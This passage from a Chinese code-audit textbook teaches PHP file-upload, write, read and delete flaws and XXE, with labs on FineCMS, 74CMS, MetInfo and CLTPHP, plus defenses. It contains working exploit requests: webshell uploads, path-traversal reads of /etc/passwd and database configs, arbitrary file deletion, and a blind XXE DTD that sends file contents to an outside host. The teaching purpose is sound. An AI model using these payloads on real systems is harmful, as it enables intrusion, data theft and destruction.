本实验将对FineCMS的V5.0.10版本进行代码审计工作，审计该CMS中是否存在文件上传漏洞。在FineCMS V5版本中/finecms/dayrui/controllers/member/Account.php文件中的函数存在文件上传功能存在正则表达式过滤不严格，导致攻击者可以上传一句话木马文件。该漏洞涉及到FineCMS V5.2版本前。

· 预备知识

参考8.1.1节：文件上传漏洞简介；8.1.2节：文件上传漏洞挖掘经验；8.1.3节： 文件上传漏洞绕过。

· 实验目的

掌握文件上传漏洞的审计方法。

· 实验环境

Windows操作系统主机；FineCMS V5.0.10安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

```
FineCMS V5.0.10是基于CI框架进行开发的，网站的功能点都在PHP文件的类中定义。该CMS在“会员头像修改”功能点存在文件上传漏洞，对该功能点进行审计分析。查看该CMS的/finecms/dayrui/controllers/member/Account.php文件中upload函数，部分代码如下：

public function upload() {
// 创建图片存储文件夹
$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';//存储文件路径
@dr_dir_delete($dir);
!is_dir($dir) && dr_mkdirs($dir);  //判断是否为文件夹与创建文件夹
    if ($_POST['tx']) {
        $file = str_replace(' ', '+', $_POST['tx']);//字符替换
//正则表达式匹配是否满足条件
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
            $new_file = $dir.'0x0.'.$result[2];
//若正则表达式过滤成功则将文件内容上传至文件中
            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                exit(dr_json(0, '目录权限不足或磁盘已满'));
            } else {
//定义config数组内容
                $this->load->library('image_lib');
$config['create_thumb'] = TRUE;
$config['thumb_marker'] = '';
$config['maintain_ratio'] = FALSE;
$config['source_image'] = $new_file;

上述upload函数代码流程为：
l  首先定义了文件的存储位置为$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/'，即“系统路径/member/{uid}/”
l  使用preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)对HTTP POST方式提交的内容进行正则匹配，若匹配成功则生成文件名。
l  调用file_put_contents函数将文件的内容写进刚刚生成的文件中（文件名为变量$new_file）。
该文件上传功能唯一的过滤点为正则表达式/^(data:\s*image\/(\w+);base64,)/。该正则表达式存在的问题是：对于“image\(/w+)”而言，如果提交的请求是image/php，文件也可以进行上传并生成php格式文件。可以利用该正则表达式过滤不严格的漏洞形成文件上传。
```

（2）文件包含漏洞利用

首先登陆FineCMS管理平台，用户名为admin、密码为admin，URL路径为：http://ip/ index.php，然后点击“会员中心”、“上传头像”，如图8-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image422.jpg)

```
图8-3 上传头像图
```

制作恶意代码文件，对“<?php phpinfo();?>”进行Base64编码，编码后结果为“PD9waHAgcGhwaW5mbygpOz8+”，文件名称为0.png。上传该文件并使用BurpSuite对数据包进行拦截修改，修改后数据包如图8-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image424.jpg)

```
图8-4上传恶意代码拦截图
```

  访问已上传的恶意脚本，URL路径为：http://ip/uploadfile/member/1/0x0.php，成功显示该恶意文件内容，如图8-5所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image426.gif)

```
图8-5恶意代码测试图
```

## 8.2 文件写入漏洞挖掘与实践

### 8.2.1 文件写入漏洞简介

不同于文件上传漏洞，任意文件写入漏洞出现的原因经常由于Web应用后台的一些文件修改编辑处，程序开发过程中将这些文件信息未做好过滤保存到了文件中，用户可以在文件中写入任意的内容，导致漏洞产生。任意文件写入可以直接Getshell，危害很大。但在渗透测试中，往往出现在CMS中。不进行代码审计的情况下很难直接获取权限，主要是因为攻击者无法判断恶意代码写入到了哪个文件中。

任意文件写入漏洞需要的前提条件包括：

l 文件写入函数的参数用户可控；

l 可控参数没有做好过滤；

l 写入的文件类型为可执行文件。

下面给出文件写入的代码案例：



<?php

$api = addslashes($_GET['api']);

file_put_contents('./option.php', $api);

?>



上述代码直接通过HTTP的GET方法传递参数api，将api内容写入到当前文件夹的option.php文件中。当访问http://ip/test.php?api=<?php phpinfo();?>时，文件option.php中写入恶意代码<?php phpinfo();?>。

### 8.2.2 文件写入漏洞挖掘经验

文件写入漏洞的审计也相对简单，从网站功能进行审计而言，文件写入漏洞经常出现在：数据库备份、文件上传、模板备份、文件备份等功能点。在进行黑盒测试时可着重关注上述的功能点进行后续审计。

从函数搜索而言，PHP代码的文件写入的常见函数包括：

l fopen函数：打开文件或者URL路径，如果打开失败则返回False；

l fwrite函数：将内容写入到一个打开的文件中，若执行成功则返回写入的字节数，否则返回False；

l fputs函数：与fwrite函数类似；

l file_put_contents函数：把一段字符串写入文件中。

其他需要注意的函数还包括：fputcsv()、socket_write()、session_write_close()、imagefttext()、imagettftext()。快速挖掘文件写入漏洞只需全局搜索上述这些函数名，定位需要审计的代码位置，同时审计该函数的参数是否可控与过滤情况即可。

常见的任意文件写入漏洞代码审计思路是：首先寻找文件写入或文件保存等相关函数，然后根据敏感函数参数回溯方法，确定函数中变量是否用户可控，过滤处理是否严格，是否保存到了可执行文件中。使用常见的代码审计工具可以很好的自动扫描出此类漏洞，当然也需要人工去逐个分析排查。

### 8.2.3 实验：74CMS3.0文件写入漏洞审计

· 实验介绍

本实验将对74CMS的V3.0版本进行代码审计工作，审计该CMS中是否存在任意文件写入漏洞。在74CMS V3.0版本中管理系统的编辑模板功能存在对写入文件过滤不严格，导致攻击者可以写入恶意代码，编辑模板的文件是/admin/admin_templates.php。

· 预备知识

参考8.2.1节：文件写入漏洞简介；8.2.2节：文件写入漏洞挖掘经验。

· 实验目的

掌握文件写入漏洞的审计方法。

· 实验环境

Windows操作系统主机；74CMS V3.0安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

对74CMS3.0全局搜索文件写入漏洞的常见函数fopen，如图8-6所示。关注调用fopen函数的同时，查看该函数对文件的权限控制情况，着重审计权限为“w”（写权限）、“w+”（读写权限）部分代码。

admin\admin_templates.php文件中存在@fopen($file_dir, 'wb'))语句，其为文件分配权限为“wb”（写入权限）。对该文件中fopen函数的参数运行敏感函数参数回溯法确定参数传递流程，同时确定是否存在过滤情况。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image428.jpg)

```
图8-6 全局搜索fopen图
```

admin\admin_templates.php文件部分代码流程：

l 当传递参数$act为do_edit时，调用check_permissions函数对用户登录状态进行校验。

l 判断模板名称是否为空并对模板内容进行过滤，在对模板内容进行过滤的过程中调用deep_stripslashes函数。

l 使用$_POST[‘tpl_dir’]拼接文件保存路径，最后使用fopen函数打开文件，使用fwrite函数写入文件内容。



elseif ($act == 'do_edit')
 {
  //调用check_permisssions函数检查用户登录状态与权限校验

**check_permissions($_SESSION['admin_purview'],"tpl_edit");**

//模板名称调用trim函数首尾去空格**
**  $tpl_name = !empty($_POST['tpl_name']) ? trim($_POST['tpl_name']) : '';
  //模板内容tpl_content调用deep_stripslashes函数进行特殊字符过滤

 $tpl_content = !empty($_POST['tpl_content']) ? **deep_stripslashes**($_POST['tpl_content']) : '';
    if(empty($tpl_name)){
  adminmsg('保存模板文件出错', 0);
    }

//文件路径拼接
    **$file_dir='../templates/'.$_POST['tpl_dir'].'/'.$tpl_name;**

**//使用fopen函数打开文件且具有写权限
**    if(!$handle = **@fopen($file_dir, 'wb')**){
    adminmsg("打开目标模版文件 $tpl_name 失败，请检查模版目录的权限",0);
    }

**//使用fwrite函数向文件中写入文件内容**
    if(**fwrite($handle, $tpl_content)** === false){
     adminmsg('写入目标 $tpl_name 失败,请检查读写权限',0);
    }
    fclose($handle);
    $link[0]['text'] = "继续编辑此文件";



上述代码中对文件内容调用了deep_stripslashes函数进行过滤，该函数最后只使用stripslashes函数进行过滤。stripslashes函数的作用是删除由addslashes函数添加的反斜杠，其并没有严格的过滤效果。因此，可以利用对模板内容过滤不严格的特性，向模板内容中写入恶意执行代码。

（2）  确定该功能访问流程

74CMS3.0中触发“do_edit”动作的前台页面为/temp/templates_c/admin_templates_file_edit.htm.php文件，如图8-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image430.jpg)

```
图8-7 前台页面代码
```

上述代码中的FORM表单触发admin_templates.php文件中的编辑模板模块，同时其该功能对应的前台页面为74CMS3.0后台管理系统中的“模板编辑”功能，如图8-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image432.jpg)

```
图8-8 模板编辑功能图
```

至此已对该系统的文件写入漏洞的流程进行全面了解，其“模板编辑”功能未对内容进行严格的过滤，其调用流程如图8-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image434.jpg)

```
图8-9 %00模板编辑功能流程图
```

（3）  文件写入漏洞利用

首先在已经登录74CMS后台管理平台的前提下，访问路径：http://ip/admin/admin_templates.php?act=do_edit，然后再利用Hackbar插件（按F12键调用）通过POST方式构建文件名和文件内容，如图8-10所示。

POST数据为tpl_name=shell.php&tpl_content=<?php phpinfo();?>

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image436.gif)

```
图8-10 文件上传利用图
```

  请求成功后，将创建一个文件名称为shell.php文件，代码内容显示php信息。使用浏览器访问生成的shell文件，路径为http://ip/templates/shell.php，页面显示效果如图8-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image438.jpg)

```
图8-11 文件上传漏洞测试图
```

## 8.3 文件读取（下载）漏洞挖掘与实践

### 8.3.1 文件读取漏洞简介

文件读取漏洞属于文件操作漏洞的的一种方式，此类漏洞在很多大型应用上都出现过。该漏洞很容易理解，部分程序在读取显示文件的时候，HTTP请求传递的读取文件参数（filename）直接在请求里面传递，后台程序获取到这个文件路径后直接读取并显示至浏览器页面。该漏洞可直接导致读取数据库配置文件，严重的话还可导致服务器端请求伪造漏洞(SSRF漏洞，该漏洞是一种由攻击者构造形成由服务器发起请求的一种安全漏洞)从而漫游至内网。

任意文件读取漏洞需要的前提条件包括：

l 应用程序中存在读取文件函数；

l 读取文件路径参数可控或对参数传递过滤不严格；

l 浏览器可显示文件内容。

下面给出文件读取的代码案例：



<?php

$filename=$_GET['f'];

echo file_get_contents($filename);

?>



上述代码直接通过HTTP的GET方法传递参数f，并显示文件内容如图8-12所示，访问路径http://ip/readfile.php?f=../../../../../etc/passwd，显示Linux系统的/etc/passwd文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image440.jpg)

```
图8-12 文件读取漏洞测试图
```

### 8.3.2 文件下载漏洞简介

文件下载漏洞与文件读取漏洞类似。一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。

任意文件读取漏洞需要的前提条件包括：

l 应用程序中存在读取文件函数；

l 读取文件路径参数可控或对参数传递过滤不严格；

l 浏览器可显示文件内容。

下面给出文件下载的代码案例：



<?php

$filename = $_GET['f'];

echo '<h1>开始下载文件！</h1><br /><br />';

echo file_get_contents($filename);

header('Content-Type: image/jpeg');

header('Content-Disposition: attachment; filename='.$filename);

header('Content-Lengh: '.filesize($filename));

?>



上述代码直接通过HTTP的GET方法传递参数f，并下载文件内容如图8-13所示，访问路径http://ip/readfile.php?f=../../../../root/.bash_history，显示Linux系统的用户命令记录文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image442.jpg)

```
图8-13 文件下载漏洞测试图
```

### 8.3.3 文件读取（下载）漏洞挖掘经验

从网站功能进行审计而言，文件读取（下载）漏洞可使用黑盒测试观察网站中存在文件读取与下载的网站功能点位置，尝试修改HTTP传递的文件名参数，测试是否存在文件读取（下载）漏洞。

对于该漏洞防御较强的网站应用而言，依旧建议使用白盒审计的方式，对文件读取（下载）漏洞的常见函数进行全局搜索，使用敏感函数参数回溯法确定读取（下载）文件函数传递的参数是否存在直接或间接的可控变量。PHP代码的文件读取（下载）漏洞常见函数包括：

l file_get_contents函数：把整个文件读入一个字符串中；

l fopen函数：打开文件或者URL路径，如果打开失败则返回False；

l highlight_file函数：对文件进行语法高亮显示；

l fread函数：读取文件（可安全用于二进制文件）；

l readfile函数：读取一个文件并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回FALSE并附带错误信息。

其他需要注意的函数还包括：fgetss()、fgets()、parse_ini_file()、file()、show_source()。快速挖掘文件写入漏洞只需全局搜索上述这些函数名，定位需要审计的代码位置，同时审计该函数的参数是否可控与过滤情况。除了上述这些函数外，还可以使用PHP的file://伪协议来读取文件。

### 8.3.4 实验：MetInfo6.0.0文件读取漏洞审计

· 实验介绍

本实验将对MetInfo6.0.0版行进行代码审计工作，审计该CMS中是否存在任意文件读取漏洞。在MetInfo6.0.0版本中app\system\include\module\old_thumb.class.php疑似有任意文件读取漏洞，导致攻击者可以读取任意文件。

· 预备知识

参考8.3.1节：文件读取漏洞简介；8.3.3节：文件读取（下载）漏洞挖掘经验。

· 实验目的

掌握文件读取漏洞的审计方法。

· 实验环境

Windows操作系统主机；MeInfo 6.0.0安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

对MetInfo全局搜索文件写入漏洞的常见函数readfile，如下图8-14所示。审计函数readfile的参数传递过程，是否存在绕过过滤的情况。本CMS中old_thumb.class.php文件的第18行存在readfile函数传参$dir。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image444.jpg)

```
图8-14 全局搜索readfile图
```

对old_thumb.class.php文件进行审计，页面建立old_thumb 类，并创建doshow方法，该方法流程：

l 首先将../和./特殊字符替换为空字符；

l 要求字符必须以HTTP开头，并且不能有./字符；

l 调用readfile函数读取文件内容，代码内容如下：



class old_thumb extends web{
    public function doshow(){
     global $_M;

//替换特殊字符../和./为空字符
     $dir = **str_replace(array('../','./'), '', $_GET['dir']);**

**//字符串以http开头，且路径不能包含./字符**
     if(**substr(str_replace($_M['url']['site'], '', $dir),0,4)
       == 'http'** && **strpos($dir, './') === false**){
       header("Content-type: image/jpeg");
       ob_start();

//根据文件路径读取文件
       **readfile($dir);**
       ob_flush();
       flush();
       die; }

…省略…



上述代码看似过滤非常完美，但是依然能够绕过，Windows操作系统下可以使用..\绕过上述过滤。

（2）  确定该功能访问流程

对该CMS的调用流程进行基本了解，从而确定如何触发上述文件读取漏洞。当输入URL为：http://[ip]/include/thumb.php?dir=xxx时，程序首先调用include\thumb.php文件，该文件会初始化old_thumb类并调用该类中的doshow方法，然后才调用old_thump.class.php文件的doshow方法并执行readfile函数读取文件。

至此已对该系统的文件读取漏洞的流程进行了解，通过对文件读取的路径过滤不严格，从而导致文件读取漏洞，其调用流程如图8-15所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image446.jpg)

```
图8-15 调用流程图
```

（3）  文件读取漏洞利用

使用BurpSuite抓取HTTP请求，设置代理Proxy同时抓取客户端请求和服务器响应，设置如图8-16所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image448.jpg)

```
图8-16 burpsuite配置图
```

使用浏览器访问URL：http://[ip]//include/thumb.php?dir=http\..\..\config\config_db.php。此时BurpSuite抓到了该请求包，点击Forward按钮将这个请求包放过，BurpSuite则会抓到服务器的响应包。在BurpSuite软件界面选择Proxy->HTTP history标签页，查看拦截的数据包，如图8-17所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image450.jpg)

```
图8-17 burpsuite抓取数据包
```

响应包的内容中则包含了config_db（网站的数据库配置文件）内容，如图8-18所示。可以发现config_db文件读取成功，当前数据库用户名密码均为root。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image452.jpg)

图8-18 文件读取测试图

## 8.4 文件删除漏洞挖掘与实践

### 8.4.1 文件删除漏洞简介

文件删除漏洞属于文件操作漏洞的的一种方式，此类漏洞经常出现在具有文件管理功能的网站程序上。其原理和文件上文提到的文件读取漏洞类似，部分程序在删除文件的时候，HTTP请求传递的删除文件名称参数（filename），后台程序获取到这个文件路径后直接删除服务器下某个文件。

任意文件删除漏洞需要的前提条件包括：

l 应用程序中存在删除文件函数；

l 删除文件路径参数可控或对参数传递过滤不严格，可使用“./”跳转路径；

l 未对文件权限进行严格限制。

下面给出文件读取的代码案例：



<?php

//判断fileUrl是否设置值，若未设置则赋值为../uploads/test.txt

$fileUrl = isset($_GET['fileUrl'])?$_GET['fileUrl']:'../uploads/test.txt';

//判断fileUrl是否存在

if(file_exists($fileUrl)){

  echo "1";

}else{

  echo $fileUrl;}

//如果fileUrl存在且fileUrl是文件则根据文件路径删除文件

if($fileUrl and is_file($fileUrl)){

  @unlink($fileUrl);}

?>



上述代码直接通过HTTP的GET方法传递参数fileUrl，该参数为指定删除的文件路径，访问路径http://ip/deleteFile.php?fileUrl=db.sql则若成功则本地测试打印1，如图8-19所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image454.gif)

图8-19文件删除测试图

### 8.4.2 文件删除漏洞挖掘经验

文件删除的漏洞挖掘采用黑盒测试与白盒审计结合的方式。使用黑盒测试对于网站中存在文件删除的功能点进行测试，尝试修改文件名参数测试能否删除任意文件，该方法可迅速定位文件删除漏洞问题。

如果无法删除任意文件，则需要对该网站进行白盒审计，对文件删除漏洞的常见函数进行全局搜索，使用敏感函数参数回溯法确定删除文件函数传递的参数是否存在可控变量。PHP代码的文件删除漏洞常见函数包括：

l unlink函数：删除文件函数，若删除成功返回True，删除失败则返回False；

### 8.4.3 实验：74CMS3.0文件删除漏洞审计

· 实验介绍

本实验将对74CMS的V3.0版本进行代码审计工作，审计该CMS中是否存在任意文件删除漏洞。在74CMS V3.0版本中管理系统的内容管理功能存在对删除文件名过滤不严，导致攻击者可以任意删除文件，编辑模板的文件是/admin/admin_article.php。

· 预备知识

参考8.4.1节：文件删除漏洞简介；8.4.2节：文件删除漏洞挖掘经验。

· 实验目的

掌握文件删除漏洞的审计方法。

· 实验环境

Windows操作系统主机；74CMS V3.0安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

对74CMS全局搜索文件删除漏洞的常见函数unlink，如图8-20所示。审计函数unlink的参数传递过程具体的过滤情况。本CMS中admin_article.php文件的第151行存在unlink函数传参$img。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image456.jpg)

图8-20 全局搜索unlink图

当传递参数$act为del_img时，其代码流程为：

l 程序对传递的参数id进行intval函数整数过滤。

l SQL语句拼接"update ".table('article')." set Small_img='' where id=".$id." LIMIT 1";更新数据库。

l 使用unlink函数删除文件（路径为“$upfiles_dir/$img”）。

l 使用unlink函数删除文件（路径为“$thumb_dir.$img”）。代码如下：



elseif($act == 'del_img')
 { //对$_GET[‘id’]进行整数过滤
  $id=intval($_GET['id']);
  $img=$_GET['img'];

//数据库更新语句拼接
  $sql="update ".table('article')." set Small_img='' where id=".$id." LIMIT 1";
  $db->query($sql);

//删除文件
  @unlink($upfiles_dir."/".$img);
  @unlink($thumb_dir.$img);
  adminmsg("删除缩略图成功！",2);
 }



上述代码在删除图像$img前并未对文件过滤，传递文件名称进行严格的过滤，这导致攻击者可以利用该漏洞删除任意文件。

（2）  确定该功能访问流程

74CMS3.0中触发“del_img”动作的前台页面为admin\templates\default\article\admin_article_edit.htm文件，代码如下：



```
{#if $edit_article.Small_img#}
<a href="{#$thumb_dir#}{#$edit_article.Small_img#}" target="_blank" >
<img src="{#$thumb_dir#}{#$edit_article.Small_img#}" border="0" /> </a>
//下面超链接标签将传递参数act为del_img，id参数和img参数
 <a href="?act=del_img&id={#$edit_article.id#}&img={#$edit_article.Small_img#}" style="color: #006600">
 [删除重新上传] </a>
 {#else#}
<input type="file" name="Small_img"    onKeyDown="alert('请点击右侧“浏览”选择您电脑上的图片！');return false"   style="height:21px; width:210px; border:1px #999999 solid" />
{#/if#}
```



```
上述代码中加粗部分的超链接标签触发的请求为“?act=del_img&id={#$edit_article.id#}&img={#$edit_article.Small_img#}”，该请求将触发admin_article.php文件中的删除文件流程，图8-21给出该漏洞的调用流程。

```

图8-21 删除图片流程

（3）  文件删除漏洞利用

为测试该CMS的文件删除漏洞，在网站根路径C:/PhpStudy/PHPTutorial/WWW目录下创建一个实验用的测试文件1.txt，用于后续删除该文件。

在浏览器中输入URL为http://[ip]/admin/admin_login.php，登录网站的管理系统。（也可使用该网站的宽字节注入登录后台管理系统）。然后测试该CMS的文件删除漏洞，删除上文创建过的1.txt文件，在浏览器中输入URL为http://[ip]/admin/admin_article.php?act=del_img&img=../../1.txt。请求成功后网站将弹出如界面8-22所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image460.jpg)

图8-22 删除图片成功图

## 8.5 文件操作漏洞防御

虽然文件操作漏洞的共同点，如表8-4所示。

表8-4 文件操作漏洞共同点

| **问题描述**                                     | **文件属性**                 |
| ------------------------------------------------ | ---------------------------- |
| 对目录文件权限设置存在问题造成越权               | 系统文件目录均具有最高权限   |
| 允许使用“../”、“./”、“..\”等方式造成目录穿越漏洞 | http://ip?filename=../../xxx |
| 对HTTP请求的参数未过滤或过滤不严导致操作任意文件 | http://ip?filename=xxx       |

针对上述漏洞共同点，给出如下的防御方法：

l 白名单

对用户上传的文件类型进行校验，建议使用白名单校验机制过滤文件扩展名。

l 对文件权限的合理管理

对于未授权的用户在未授权的情况下禁止查看、删除、执行文件等操作。

l 严格控制文件名参数传递

避免使用传递文件名的方式。可通过将文件名、文件路径、文件md5的ID号、当前操作用户等信息存储到数据库中，然后通过传递文件ID和当前操作用户的方式判断文件是否存在及用户是否有权限下载该文件。

对于已知文件名称的文件操作功能点，使用后台代码直接指定操作文件名，不使用参数传递的方式传递文件名称。

l 禁止目录跳转

对于文件编辑操作功能，若需要传入文件路径，则可通过后台代码固定待操作的文件目录，同时禁止HTTP请求传递的参数路径中带有“..”、“/”、“\”的字符。

l 使用随机数改写文件名和文件路径

应用随机数改写文件名和路径，增加攻击这操作文件的难度。例如：采用时间戳拼接随机数的MD5值方式“md5(time()+rand(1,10000))”。

## 8.6 单元小结

本单元主要学习了代码审计中的文件操作漏洞，分别包括：文件上传漏洞、文件写入漏洞、文件读取（下载）漏洞、文件删除漏洞。通过对常见漏洞函数进行列举，使读者熟悉常见的审计文件操作漏洞的方法，下图8-26为文件操作漏洞的审计总结图。



 

# 单元9 XXE与SSRF漏洞审计

本单元介绍了代码审计中XXE漏洞、SSRF漏洞安全问题的审计，其主要分为三部分进行介绍。

第一部分介绍XXE漏洞的基础知识，包括：XXE漏洞的基本概念、XXE漏洞审计方法、XXE漏洞防御方法等。

第二部分介XXE漏洞的分类，包括：通过DTD外部实体声明、通用实体、参数实体，并使用CLTPHP5.5.3进行XXE漏洞审计实践。

第三部分介绍SSRF漏洞的基本知识并使用APPCMS2.0进行SSRF漏洞的审计实践。

**单元构图：**

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image462.jpg)**

**单元目标：**

\1.  了解XXE与SSRF漏洞的原理、挖掘技巧；

\2.  掌握XXE与SSRF漏洞的常见代码审计方法；

\3.  掌握XXE与SSRF漏洞的防御方法；

## 9.1 XXE漏洞挖掘

### 9.1.1 XXE漏洞简介

XXE（XML External Entity）漏洞名为XML外部实体注入。该漏洞成因是应用程序在解析XML时没有过滤外部实体（外部实体包括一般实体和外部参数实体）的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网等危害。

### 9.1.2 XXE漏洞挖掘

在代码审计中挖掘XXE漏洞方法相对单一，由于XXE漏洞需要对XML文件进行解析，因此可以对PHP代码进行全局搜索解析XML文件的函数，使用敏感函数参数回溯法分析参数是否可控并绕过过滤即可。

XXE漏洞的敏感函数包括：

l simplexml_load_string()：转换形式良好的XML字符串为SimpleXMLElement对象。

l simplexml_load_file()：函数把XML文档载入对象中。

l simplexml_import_dom()：函数把 DOM 节点转换为 SimpleXMLElement 对象。

## 9.2 XXE漏洞分类

根据使用的XXE Payload不同，一般将XXE漏洞分为：直接声明实体、引用外部DTD（通用实体）、引用外部DTD（参数实体）、无回显XXE，本小节将对常见的XXE漏洞进行介绍。

审计案例代码如下：



<?php

libxml_disable_entity_loader (false);//关闭禁止外部实体引用功能

$xmlfile = file_get_contents('php://input');//从HTTP的POST请求接收数据

$dom = new DOMDocument(); //创建DOM对象

$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//根据xmlfile转换为DOM节点

$creds = **simplexml_import_dom**($dom);// 函数把 DOM 节点转换为 SimpleXMLElement 对象

echo $creds;

?>



上述代码流程为：

l 通过php://input获取网站的输入流并将其赋值为$xmlfile。

l 然后将$xmlfile转换为DOM节点。

l DOM节点转换为SimpleXMLElement 对象并打印。

l 由于程序未对用户输入进行过滤就将其转换为xml对象，因此存在XXE漏洞。

下面对XXE的三种注入方式进行介绍：

  （1）直接通过DTD外部实体声明

  在XML文件的DTD中直接指定元素为实体b，定义值为读取c:/1.txt文件内容，其xml如下：



<?xml version="1.0"?>

<!DOCTYPE a [**<!ENTITY b SYSTEM "file:///c:/flag.txt" >**]>

<x>&b;</x>



  （2）引用外部DTD（通用实体）

  该方式为使用通用实体引用读取文件或访问网络，这是比较简单的一种XXE注入方式。在XML的DTD定义引用外部的DTD文件，使用“&实体名;”的形式引用实体，其xml如下：



<?xml version="1.0"?>

<!DOCTYPE a [

​    <!ENTITY **b** SYSTEM "**http://127.0.0.1/evil.dtd**">

]>

<a>&b;</a>

\#而http://127.0.0.1/evil.dtd内容为

**<!ENTITY b SYSTEM " file:///c:/ flag.txt ">**



  （3）引用外部DTD（参数实体）

该方式为使用参数读取文件或访问网络，该方式和通用实体一样，参数实体可以外部引用。同时，使用“% 实体名;”（%与实体名中间有空格）的形式在DTD中定义，并且只有在DTD中使用“%实体名;”引用。只有在DTD文件中，参数实体的声明才能引用其他实体。



<?xml version="1.0"?>

<!DOCTYPE a [

<!ENTITY **% b** SYSTEM "http://127.0.0.1/evil.dtd">

   **%b;**

]>

<a>%b;</a>

\#http:// 127.0.0.1/evil.dtd文件内容

**<!ENTITY b SYSTEM " file:///c:/ flag.txt ">**



（4）无回显XXE读取文件

在很多情况下，PHP代码并不会将XML引用的外部参数值打印值前台页面中，一般称为“无回显读取本地敏感文件（Blind OOB XXE）”。这就需要借助于netcat工具并开启端口节后接收请求数据，同时引用外部DTD并控制该DTD向外发送HTTP请求将内容发送主至netcat开启的端口，从而显示内容。



<?xml version="1.0"?>

<!DOCTYPE convert [

<!ENTITY **% remote** SYSTEM "http://127.0.0.1/evil.dtd">

   **%remote;%int;%send;**

]>

\#http:// 127.0.0.1/evil.dtd文件内容如下，且192.168.0.7的主机开启9999端口

<!ENTITY **% file** SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">

<!ENTITY **% int** "<!ENTITY &#37;send SYSTEM 'http://192.168.0.7:9999?p=%file;'>">



## 9.3 XXE漏洞防御

XXE漏洞防御的主要问题在于PHP代码对XML进行了解析，同时XML可引用外部DTD文件导致的，下面给出XXE漏洞防御建议：

（1）使用开发语言提供的禁用外部实体的方法。对于PHP而言，使用方法为：libxml_disable_entity_loader(true);。

（2）过滤用户提交的XML关键字。常见的关键字包括：<!DocTYPE、<!ENTITY、SYSTEM、PUBLIC等。

（3）检查网站的XML文件，不允许XML文件中含有自己定义的DTD。

## 9.4 XXE审计CMS实践

### 9.4.1  实验：CLTPHP5.5.3 XXE审计

· 实验介绍

本实验将对CLTPHP V5.5.3版本进行代码审计工作，审计该CMS中是否存在XXE漏洞。

· 预备知识

参考9.1节：XXE漏洞挖掘；9.2节：XXE漏洞分类。

· 实验目的

掌握XXE漏洞的审计方法。

· 实验环境

Windows操作系统主机；CLTPHP V5.5.3安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

对CLTPHP全局搜索XXE漏洞的常见函数simplexml_load_string，如图9-1所示。审计函数simplexml_load_string的参数传递过程具体的过滤情况。该CMS中文件app\wchat\controller\Wchat.php的第111行存在unlink函数。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image464.jpg)

图9-1 全局搜索simplexml_load_string图

对Wchat.php文件的getMessage函数进行审计，其代码如下：



  public function getMessage()

  {

​    **$from_xml = file_get_contents('php://input');//****将用户输入赋值给变量$form_xml**

​    if (empty($from_xml)) {return;}//判断$form_xml是否为空

​    $signature = input('msg_signature', '');

​    $signature = input('timestamp', '');

​    $nonce = input('nonce', '');

​    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];

​    **$ticket_xml = $from_xml;//****将$form_xml变量赋值给变量$ticken_xml**

​    **$postObj = simplexml_load_string($ticket_xml, 'SimpleXMLElement', LIBXML_NOCDATA);        //****将$ticket_xml变量转换为键值对类型**

​    $this->instance_id = 0;

​    if (!empty(**$postObj->MsgType**)) { //如果$postObj->MsgType不为空

​      switch (**$postObj->MsgType**) {

​        case "**text**":       //如果$postObj->MsgType为test

​          $resultStr = **$this->MsgTypeText($postObj);**

​          break;

​        case "**event**":      //如果$postObj->MsgType为event

​          $resultStr = **$this->MsgTypeEvent($postObj);**

​          break;

​        default:

​          $resultStr = "";

​          break;}}

​    if (!empty($resultStr)) {echo $resultStr;//如果$resultStr不为空将其打印

​    } else {echo '';}//否则打印空字符}



上述代码流程：

l 将用户输入的内容赋值给$form_xml变量。

l 调用simplexml_load_string函数对$form_xml变量转换为键值对，赋值给变量$postObj。

